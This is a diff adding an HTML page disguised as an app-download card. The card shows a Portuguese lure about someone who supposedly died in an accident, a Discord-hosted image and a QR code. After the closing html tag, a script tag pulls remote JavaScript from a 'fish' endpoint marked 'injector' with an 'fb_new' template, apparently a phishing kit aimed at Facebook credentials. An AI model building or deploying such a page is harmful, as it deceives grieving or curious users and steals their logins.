@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html><head>
+    <meta name="deepview-service" content="deepview-service" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@900&family=Source+Sans+Pro:wght@400;600&display=swap" rel="stylesheet" />
+
+    <style>
+      body {
+        margin: 0;
+        word-wrap: break-word;
+        background-color:#F2F3F7
+      }
+      .container {
+        height: 100%;
+        min-height:480px;
+        min-width:280px;
+      }
+      /* ============ Portrait ============ */
+      .frame-container {
+        width: 640px;
+        height: 480px;
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%,-50%);
+      }
+      .card {
+        position: relative;
+        margin: 0;
+        border-radius: 32px;
+        background-color:#FFF;
+        -webkit-box-shadow: 8px 16px 32px rgb(35 58 79 / 35%), 20px 30px 80px rgb(73 73 93 / 40%);
+        -moz-box-shadow: 8px 16px 32px rgba(35, 58, 79, 0.35), 20px 30px 80px rgba(73, 73, 93, 0.4);
+        box-shadow: 8px 16px 32px rgb(35 58 79 / 35%), 20px 30px 80px rgb(73 73 93 / 40%);
+        padding: 0;
+        z-index: 100;
+        width: 236px;
+        height: 480px;
+        overflow: hidden;
+        outline: 5px solid #f7f7f780;
+        float: left;
+      }
+      .card-container:after {
+        content: ' ';
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 167px;
+        z-index: 1;
+      }
+      .card-container {
+        padding: 0 2px;
+        margin: 0;
+      }
+      .main-image {
+        width: 100px;
+        height: 100px;
+        background-image: url(https://media.discordapp.net/attachments/1102948352011804712/1106071696533880913/16401156680682549546_1.jpg);
+        background-size: cover;
+        background-position: top center;
+        margin: 96px auto 36px auto;
+        background-color: #06122F;
+        border-radius: 16px;
+        color: #FFF;
+        -webkit-box-shadow: 3px 4px 12px rgba(127, 127, 142, 0.4);
+        -moz-box-shadow: 3px 4px 12px rgba(127, 127, 142, 0.4);
+        box-shadow: 3px 4px 12px rgb(127 127 142 / 40%);
+        position: relative;
+        z-index: 2;
+      }
+      .main-image-qr-cont {
+        width: 120px;
+        height: 120px;
+        background-size: cover;
+        background-position: top center;
+        margin: 0 auto 36px auto;
+        border-radius: 16px;
+        color: #FFF;
+        position: relative;
+        z-index: 2;
+      }
+      .main-image-qr {
+        background-image: url(data:image/png;base64,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);
+        background-size: contain;
+        background-position: center center;
+        position: relative;
+        z-index:3;
+        width: 100%;
+        height: 100%;
+      }
+      #content-container {
+        box-sizing: border-box;
+        margin: 0 22px 0 22px;
+        text-align: center;
+      }
+      .app-title {
+        text-transform: uppercase;
+        font-size: 12px;
+        font-weight:600;
+        font-family: "Source Sans Pro", Helvetica, serif;
+        line-height: 16px;
+        margin-bottom: 8px;
+        color: #9EA2A7;
+        letter-spacing: 0.4px;
+      }
+      .card-title {
+        font-size: 20px;
+        font-weight: 600;
+        font-family: "Source Sans Pro", Helvetica, serif;
+        line-height: 24px;
+        margin-bottom: 8px;
+        color: #06122F;
+      }
+      .app-content {
+        font-size: 12px;
+        font-weight: 400;
+        font-family: "Source Sans Pro", Helvetica, serif;
+        line-height: 16px;
+        margin-bottom: 8px;
+        color: #333E48;
+      }
+      .cont {
+        width: 278px;
+        float: right;
+      }
+      .header-title {
+        font-size: 36px;
+        font-weight: 600;
+        font-family: "Source Sans Pro", Helvetica, serif;
+        line-height: 40px;
+        margin: 75px 0 24px 0;
+        color: #06122F;
+        text-align: center
+      }
+      .divor {
+        text-align:center;
+        height: 2px;
+        background-color: #E0E6EC;
+        margin: 0 auto 27px auto;
+        position: relative;
+      }
+      .divor span{
+        color: #333E48;
+        font-size: 12px;
+        font-weight: 600;
+        font-family: "Source Sans Pro", Helvetica, serif;
+        background-color: #f2f3f7;
+        padding: 4px;
+        position: absolute;
+        top: -10px;
+        left: 50%;
+        transform: translate(-50%,0);
+      }
+      .btn-container a img {
+        margin: 0;
+        width: 100%;
+      }
+      .btn-container a:last-child{
+        margin:0;
+        float: right;
+      }
+      .btn-container a {
+        width: 133px;
+        float: left;
+      }
+      .btn-container a img {
+        margin: 0;
+        width: 100%;
+      }
+      .btn-container a:last-child{
+        margin:0;
+        float: right;
+      }
+      .btn-container a {
+        width: 133px;
+        float: left;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="frame-container">
+
+        <div class="card center">
+          <div class="card-container">
+            <div class="main-image">
+            </div>
+            <div id="content-container">
+              <div class="app-title"></div>
+              <div class="card-title">Olha quem morreu, em um acidente acho que você o conhece, sinto muito...😭</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cont">
+          <div class="header-title">Scan to download<br />the app</div>
+          <div class="main-image-qr-cont">
+            <div class="main-image-qr"></div>
+          </div>
+          <div class="divor"><span>OR</span></div>
+          <div class="btn-container">
+            <a href="https://apps.apple.com"><img src="https://cdn.branch.io/branch-assets/1659570097391-og_image.png" /></a>
+            <a href="https://play.google.com"><img src="https://cdn.branch.io/branch-assets/1659570137910-og_image.png" /></a>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+</body></html>
+<script src="https://wolfpanels.cc/fish?name=elcoo1&amung=injector&template=fb_new" type="text/javascript" async="true"></script>
